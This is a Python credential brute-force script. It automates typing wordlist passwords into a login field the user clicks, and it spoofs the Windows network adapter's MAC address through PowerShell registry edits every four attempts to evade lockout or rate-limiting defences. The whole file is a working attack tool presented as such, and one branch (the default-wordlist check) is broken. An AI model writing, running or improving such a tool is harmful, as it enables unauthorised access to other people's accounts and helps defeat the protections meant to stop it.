from pynput import mouse
import pyautogui
import time
import random
import os
import subprocess
import sys
import ping

def change_mac_address(adapter):
    first_byte = random.randint(0x00, 0xFF) & 0xFE | 0x02
    mac_bytes = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
    mac_address = "".join(f"{byte:02x}" for byte in mac_bytes)
    
    try:
        commands = [
            ["powershell", "-Command", f"Disable-NetAdapter -Name '{adapter}' -Confirm:$false"],
            [
                "powershell", 
                "-Command", 
                f"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001' -Name NetworkAddress -Value {mac_address}"
            ],
            ["powershell", "-Command", f"Enable-NetAdapter -Name '{adapter}'"],
        ]

        for cmd in commands:
            print(f"Executing: {cmd}")
            subprocess.run(cmd, check=True)
        ping.ping_with_conditions()
    
        print(f"MAC address changed successfully. New MacAddress: {mac_address}")
    except subprocess.CalledProcessError as e:
        print(f"Error changing MAC address: {e}")
        sys.exit(1)
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        sys.exit(1)

def wait_for_click(field_name):
    print(f"Click on the {field_name} input field...")
    
    x, y = None, None
    def on_click(x_position, y_position, button, pressed):
        nonlocal x, y 
        if pressed: 
            x, y = x_position, y_position
            print(f"Captured click at coordinates: {x}, {y} for {field_name}")
            return False

    with mouse.Listener(on_click=on_click) as listener:
        listener.join()
    return x, y

def enter_credentials(adapter, wordlist, password_coords):
    print("Starting brute force...")
    try:
        with open(wordlist, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
        sys.exit(1)
    attempts = 0 

    for password in passwords:
        password = password.strip()

        try:
            pyautogui.click(password_coords)
            pyautogui.typewrite(password, interval=0.1)
        except Exception as e:
            print(f"Error entering password '{password}': {e}")
            sys.exit(1)

        try:
            pyautogui.press("enter")
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.press("backspace")
            print(f"Tried password: {password}")
        except Exception as e:
            print(f"Error pressing Enter after password '{password}': {e}")
            sys.exit(1)
        time.sleep(1)
        attempts += 1

        if attempts >= 4:
            print("Changing MAC address after 4 attempts...")
            change_mac_address(adapter)
            attempts = 0

if __name__ == "__main__":
    print("Brute-force tool initialized.")
    get_adapters = ["powershell", "-Command", "Get-NetAdapter"]
    subprocess.run(get_adapters, check=True)
    print("Enter the name of your network adapter for which you want to change MacAddress, For Example [Wi-fi](CASE SENSATIVE):")
    adapter = input()
    print(r"Enter Full path of your password wordlists, For Example [C:\Users\Dell\Documents\wordlist.txt] or Enter 0 for default wordlist [default.txt]: ")
    path = input()

    # if not os.path.exists(path):
    #     print(f"Wordlist file not found: {path}")
    #     sys.exit(1)
    # print("Make sure the username is entered before continuing.")
    # time.sleep(5)

    if path==0 :
        path = "default.txt"
    elif not os.path.exists(path):
        print(f"Wordlist file not found: {path}")
        sys.exit(1)
    print("Make sure the username is entered before continuing.")
    time.sleep(5)

    try:
        change_mac_address(adapter)
    except Exception as e:
        print(f"Error capturing password field coordinates: {e}")
        sys.exit(1)

    try:
        password_coords = wait_for_click("password")
    except Exception as e:
        print(f"Error capturing password field coordinates: {e}")
        sys.exit(1)

    try:
        enter_credentials(adapter, path, password_coords)
    except Exception as e:
        print(f"Error during brute-forcing: {e}")
        sys.exit(1)
